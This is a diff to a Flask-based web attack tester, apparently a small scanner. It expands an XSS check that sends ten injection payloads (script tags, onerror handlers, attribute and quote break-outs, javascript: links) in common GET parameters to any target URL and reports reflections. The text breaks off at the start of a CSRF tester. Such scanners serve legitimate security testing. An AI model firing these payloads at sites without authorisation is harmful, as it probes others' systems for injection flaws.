@@ -1,4 +1,5 @@
 from flask import Flask, request, jsonify
+from urllib.parse import urlencode
 import requests
 
 app = Flask(__name__)
@@ -9,46 +10,55 @@ ATTACKS = {
     "csrf": "run_csrf_test"
 }
 
-
-# test
-
 # --- Attack Handlers ---
 
 # XSS Attack Tester
-# Enhanced XSS Tester for Inputs Allowing HTML Tags
 def run_xss_test(target_url):
-    # Updated payloads to focus on text inputs allowing HTML tags
+    # Payloads for different contexts (including Level 3 manipulation)
     XSS_PAYLOADS = [
-        '<script>alert("XSS")</script>',
-        '<img src=x onerror="alert(\'XSS\')">',
-        '<svg onload=alert(1)>',
-        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
-        '<a href="javascript:alert(\'XSS\')">Click me</a>'
+        '<script>alert("XSS")</script>',  
+        '<img src=x onerror="alert(\'XSS\')">', 
+        '"><script>alert("XSS")</script>', 
+        '"><img src=x onerror=alert(1)>',  
+        "';alert('XSS');//", 
+        "');alert('XSS');//", 
+        "' onmouseover='alert(1)' bad='",  
+        '" autofocus onfocus="alert(1)"', 
+        "<a href='javascript:alert(\"XSS\")'>Click me</a>",  
+        "\"><img src=1 onerror='location.href=\"javascript:alert(1)\"'>"
     ]
-    PARAM_NAMES = ["input", "text", "content", "query"]
+
+    # Common parameter names that could be vulnerable
+    PARAM_NAMES = ["query", "input", "text", "content", "search"]
 
     results = []
+
     for param_name in PARAM_NAMES:
         for payload in XSS_PAYLOADS:
             try:
-                # Send a request with each payload
-                response = requests.get(target_url, params={param_name: payload})
+                # Prepare parameters for the GET request
+                params = {param_name: payload}
+                response = requests.get(target_url, params=params)
 
-                # Inspect response content for reflected payloads
-                if payload in response.text:
-                    # Check for execution-like patterns
+                # Check if the payload is reflected
+                if payload in response.text or payload.replace('<', '&lt;').replace('>', '&gt;') in response.text:
                     results.append({
                         "parameter": param_name,
                         "payload": payload,
-                        "vulnerable": True
+                        "vulnerable": True,
+                        "snippet": response.text[:150]  
                     })
-            except requests.RequestException:
-                pass
+
+            except requests.RequestException as e:
+                results.append({
+                    "parameter": param_name,
+                    "payload": payload,
+                    "error": str(e)
+                })
 
     return results
 
-
-# CSRF Attack Tester
+# CSRF Attack Tester (unchanged)
 def run_csrf_test(target_url):
     CSRF_DATA_SETS = [
         {"test_field": "csrf_test1"},
